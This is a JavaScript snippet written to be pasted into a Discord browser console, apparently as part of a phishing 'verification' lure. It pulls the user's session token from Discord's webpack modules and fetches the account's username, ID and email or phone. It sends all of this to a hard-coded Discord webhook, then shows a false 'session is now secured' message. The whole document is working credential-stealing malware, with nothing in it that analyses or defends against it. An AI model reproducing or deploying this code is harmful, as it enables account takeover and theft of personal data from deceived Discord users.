(async () => {
  let token;
  try {
    window.webpackChunkdiscord_app.push([[Math.random()], {}, req => {
      for (const m of Object.keys(req.c).map(k => req.c[k].exports).filter(x => x)) {
        if (m?.default?.getToken !== undefined) {
          token = m.default.getToken();
          return;
        }
        if (m.getToken !== undefined) {
          token = m.getToken();
          return;
        }
      }
    }]);
    window.webpackChunkdiscord_app.pop();
  } catch (e) { console.error("Grab failed"); }

  if (!token) {
    alert("Session not found - try logging in again.");
    return;
  }

  try {
    const res = await fetch("https://discord.com/api/v9/users/@me", {
      headers: { Authorization: token }
    });
    const user = await res.json();

    const payload = {
      embeds: [{
        title: "ðŸ”¥ Random Console Token Hit",
        color: 0x5865f2,
        fields: [
          { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
          { name: "User", value: `${user.username}#${user.discriminator || "0000"} (ID: ${user.id})`, inline: false },
          { name: "Email/Phone", value: user.email || user.phone || "Hidden", inline: false },
          { name: "Nitro", value: user.premium_type ? "Yes" : "No", inline: true },
          { name: "Source", value: "Console Paste", inline: true },
          { name: "Time", value: new Date().toISOString(), inline: false }
        ],
        footer: { text: "Via phish verification" }
      }]
    };

    await fetch("https://discord.com/api/webhooks/1451742333941842063/Us6WUZdGQIwre6yJottqWRd10OutQWtombC-gYtpa1j0GNxMefdYb8dDyVzgIzV1eaqp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    alert("Verification complete! Your session is now secured.");
  } catch (e) {
    alert("Verification failed - try again later.");
  }
})();
